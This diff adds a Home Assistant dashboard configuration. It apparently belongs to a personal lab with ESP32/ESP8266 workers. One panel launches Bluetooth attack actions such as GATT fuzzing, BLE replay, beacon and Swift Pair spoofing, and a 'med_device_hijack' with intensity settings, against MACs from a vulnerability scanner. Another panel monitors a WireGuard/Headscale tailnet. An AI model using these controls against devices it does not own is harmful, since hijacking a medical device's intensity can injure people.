+              ⚠ **Nur eigene Geräte**. Stop-Button bei Bedarf.
+
+          - type: entities
+            title: Worker / Target / Action
+            entities:
+              - entity: input_select.poc_worker
+                name: Worker
+              - entity: input_select.poc_target_mac
+                name: Ziel-MAC (aus Vuln-Scanner)
+              - entity: input_select.poc_action
+                name: Aktion
+            state_color: true
+
+      - type: grid
+        cards:
+          - type: entities
+            title: Aktion-Parameter
+            entities:
+              - type: section
+                label: gatt_fuzzer / med_device_hijack
+              - input_text.poc_target_uuid
+              - type: section
+                label: ble_replay
+              - input_text.poc_payload_hex
+              - type: section
+                label: ibeacon_spoof / swift_pair_spoof
+              - input_text.poc_spoof_name
+              - input_text.poc_ibeacon_uuid
+              - input_number.poc_ibeacon_major
+              - input_number.poc_ibeacon_minor
+              - type: section
+                label: med_device_hijack Intensity-Range
+              - input_number.poc_intensity_min
+              - input_number.poc_intensity_max
+
+          - type: vertical-stack
+            cards:
+              - type: button
+                name: ▶ Ausführen
+                icon: mdi:play-circle
+                tap_action:
+                  action: call-service
+                  service: script.run_poc_action
+                hold_action:
+                  action: more-info
+              - type: button
+                name: ⏹ Stop alle Worker
+                icon: mdi:stop-circle
+                tap_action:
+                  action: call-service
+                  service: script.run_poc_stop
+
+      - type: grid
+        cards:
+          - type: entities
+            title: Worker-Status (live)
+            entities:
+              - entity: sensor.esp32_poc_worker_worker1_mode
+                name: ESP32 Worker1 Mode
+              - entity: sensor.esp32_worker_last_result
+                name: ESP32 Last Message
+              - entity: sensor.esp8266_wifi_worker_wifi1_wifi_probe_gerate
+                name: ESP8266 WiFi Probes
+                secondary_info: last-changed
+
+          - type: markdown
+            title: Letzte Status-Nachrichten (ESP32)
+            content: |
+              {%- set s = state_attr('sensor.esp32_worker_last_result', 'msg') %}
+              **Mode**: {{ state_attr('sensor.esp32_worker_last_result', 'mode') or 'idle' }}
+              **Target**: {{ state_attr('sensor.esp32_worker_last_result', 'target') or '-' }}
+              **Last**: `{{ s or '(no msg yet)' }}`
+              **Mode-Age**: {{ state_attr('sensor.esp32_worker_last_result', 'mode_age_s') or 0 }}s
+
+              ESP32 Scan-Result (wenn action=scan):
+              {%- set found = state_attr('sensor.esp32_worker_last_result', 'found') or [] %}
+              {% if found %}
+              | MAC | RSSI | Name |
+              |---|---|---|
+              {%- for d in found[:15] %}
+              | `{{ d.mac }}` | {{ d.rssi }} | {{ d.name }} |
+              {%- endfor %}
+              {% else %}
+              _kein Scan-Ergebnis aktuell_
+              {% endif %}
+
+      - type: grid
+        cards:
+          - type: markdown
+            title: ESP8266 Probe-Tabelle
+            content: |
+              {%- set probes = state_attr('sensor.esp8266_wifi_worker_wifi1_wifi_probe_gerate', 'devices') or [] %}
+              {%- if probes %}
+              | MAC | RSSI | SSID | Ch | Count |
+              |---|---|---|---|---|
+              {%- for p in probes[:20] %}
+              | `{{ p.mac }}` | {{ p.rssi }} | `{{ p.ssid }}` | {{ p.channel }} | {{ p.count }} |
+              {%- endfor %}
+              {%- else %}
+              _ESP8266-Worker noch nicht aktiv (flashen + WiFi-Connect abwarten)_
+              {%- endif %}
+
+  # =========================================================================
+  # Tailnet (Headscale + Travel-Pi via WG)
+  # =========================================================================
+  - title: Tailnet
+    path: tailnet
+    icon: mdi:vpn
+    type: sections
+    max_columns: 2
+    sections:
+      # --- Travel Pi (WG-Proxy) ---
+      - type: grid
+        cards:
+          - type: entities
+            title: "Travel Pi (WG-Tunnel)"
+            state_color: true
+            entities:
+              - entity: binary_sensor.travel_pi_online
+                name: "Status (Handshake <3 min)"
+              - entity: sensor.travel_pi_last_handshake
+                name: "Letzter Handshake"
+              - entity: sensor.travel_pi_endpoint
+                name: "Letzter Endpoint (Pi-WAN)"
+              - entity: sensor.travel_pi_rx
+                name: "RX (vom Pi)"
+              - entity: sensor.travel_pi_tx
+                name: "TX (zum Pi)"
+              - type: section
+                label: "Tunnel-Adresse"
+              - type: weblink
+                name: "SSH 10.6.0.2"
+                url: "ssh://pi@10.6.0.2"
+                icon: mdi:console-network
+
+          - type: markdown
+            title: "Travel Pi Diagnose"
+            content: |
+              **Pi-Tunnel-IP:** `10.6.0.2`
+              **WG-Server:** AdGuard (192.168.178.145) · `wg0` 10.6.0.1/24 · UDP 51820
+              {% set tp = state_attr('sensor.tailnet_status','travel_pi') %}
+              {%- if tp %}
+
+              | Feld | Wert |
+              |---|---|
+              | Pubkey | `{{ tp.pubkey_short }}…` |
+              | Allowed-IP | `{{ tp.allowed_ip }}` |
+              | Online (WG) | {{ '🟢 ja' if tp.online else '🔴 nein' }} |
+              | Reason | `{{ tp.reason }}` |
+              | RX/TX | {{ (tp.rx_bytes / 1048576) | round(1) }} / {{ (tp.tx_bytes / 1048576) | round(1) }} MiB |
+              {%- else %}
+              _Keine WG-Daten verfügbar_
+              {%- endif %}
+
+      # --- Headscale Peers ---
+      - type: grid
+        cards:
+          - type: entities
+            title: "Headscale Peers (thesoc.internal)"
+            state_color: true
+            entities:
+              - entity: sensor.headscale_peers_online
+                name: "Peers Online"
+              - entity: sensor.headscale_peers_total
+                name: "Peers Gesamt"
+              - type: section
+                label: "Geräte"
+              - entity: binary_sensor.headscale_nuc12_online
+                name: "NUC12 (Windows)"
+              - entity: binary_sensor.headscale_synnas_online
+                name: "Synology"
+              - entity: binary_sensor.headscale_iphone_online
+                name: "iPhone Marcus"
+              - entity: binary_sensor.headscale_capev2_online
+                name: "CapeV2"
+              - entity: binary_sensor.headscale_gw_online
+                name: "Headscale-GW (Hetzner)"
+
+          - type: markdown
+            title: "Tailnet Live-Tabelle"
+            content: |
+              {% set hs = state_attr('sensor.tailnet_status','headscale') %}
+              {%- if hs %}
+              **Self:** `{{ hs.self.hostname }}` · {{ hs.self.ip }}
+
+              | Peer | Tailnet-IP | OS | Status |
+              |---|---|---|---|
+              {%- for p in hs.peers %}
+              | {{ p.hostname }} | `{{ p.ip }}` | {{ p.os }} | {{ '🟢' if p.online else '🔴' }} |
+              {%- endfor %}
+
+              _Update alle 30 s via `/usr/local/bin/tailnet-status.sh`_
+              {%- else %}
+              _Keine Headscale-Daten verfügbar_
+              {%- endif %}
